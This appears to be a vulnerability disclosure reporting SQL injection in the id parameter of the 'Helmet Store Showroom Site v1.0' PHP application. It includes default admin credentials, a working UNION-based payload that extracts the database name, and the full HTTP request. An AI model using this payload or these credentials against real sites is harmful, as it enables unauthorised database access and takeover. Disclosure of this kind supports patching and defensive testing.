# Helmet Store Showroom Site v1.0 by oretnom23 has SQL injection

BUG_Author: HMHYHM

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/15851/helmet-store-showroom-site-php-and-mysql-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /hss/?page=view_product&id=

Vulnerability location: /hss/?page=view_product&id=, id

dbname =hss_db,length=6

[+] Payload: /hss/?page=view_product&id=-5%27%20union%20select%201,2,3,4,database(),6,7,8,9,10,11,12,13--+ // Leak place ---> id


```sql
GET /hss/?page=view_product&id=-5%27%20union%20select%201,2,3,4,database(),6,7,8,9,10,11,12,13--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=29mcgvmjo6mqsepd64ra2rlt4v
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/204069408-b8e0eb58-300e-48fb-abfe-131ab0648dbe.png)
